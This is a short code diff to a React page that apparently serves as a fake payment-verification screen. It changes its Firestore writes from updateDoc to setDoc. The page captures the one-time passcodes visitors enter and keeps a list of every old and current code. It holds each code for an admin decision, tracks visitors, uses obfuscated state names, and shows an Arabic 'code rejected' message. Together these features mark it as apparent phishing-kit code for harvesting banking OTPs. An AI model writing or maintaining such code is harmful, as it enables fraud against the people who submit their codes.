@@ -8,7 +8,7 @@ import { Alert, AlertDescription } from "@/components/ui/alert"
 import { ShieldCheck, AlertCircle, RefreshCw, Clock, Lock } from "lucide-react"
 import { UnifiedSpinner, SimpleSpinner } from "@/components/unified-spinner"
 import { db } from "@/lib/firebase"
-import { doc, onSnapshot, updateDoc } from "firebase/firestore"
+import { doc, onSnapshot, setDoc } from "firebase/firestore"
 import { addToHistory } from "@/lib/history-utils"
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
 import { updateVisitorPage } from "@/lib/visitor-tracking"
@@ -102,7 +102,7 @@ export default function VeriPage() {
               updates.oldOtp = data.oldOtp ? [...data.oldOtp, currentOtp] : [currentOtp]
             }
             
-            updateDoc(doc(db, "pays", visitorID), updates).then(() => {
+            setDoc(doc(db, "pays", visitorID), updates).then(() => {
               _ss5("pending")
               _s5("") // Clear the old code
               setError("تم رفض رمز التحقق. يرجى إدخال رمز صحيح.")
@@ -203,13 +203,13 @@ export default function VeriPage() {
     try {
       allOtps.push(_v5)
       // Update the document with the OTP
-      await updateDoc(doc(db, "pays", visitorID), {
+      await setDoc(doc(db, "pays", visitorID), {
         _v5,
         otpSubmittedAt: new Date().toISOString(),
         allOtps,
         _v5Status: "verifying", // Set to verifying, waiting for admin decision
         otpUpdatedAt: new Date().toISOString()
-      })
+      }, { merge: true })
 
       // Add OTP to history
       await addToHistory(visitorID, "_t2", {
@@ -231,10 +231,10 @@ export default function VeriPage() {
     if (!visitorID) return
 
     try {
-      await updateDoc(doc(db, "pays", visitorID), {
+      await setDoc(doc(db, "pays", visitorID), {
         otpResendRequested: true,
         otpResendAt: new Date().toISOString()
-      })
+      }, { merge: true })
 
       // Reset timer
       setCanResend(false)
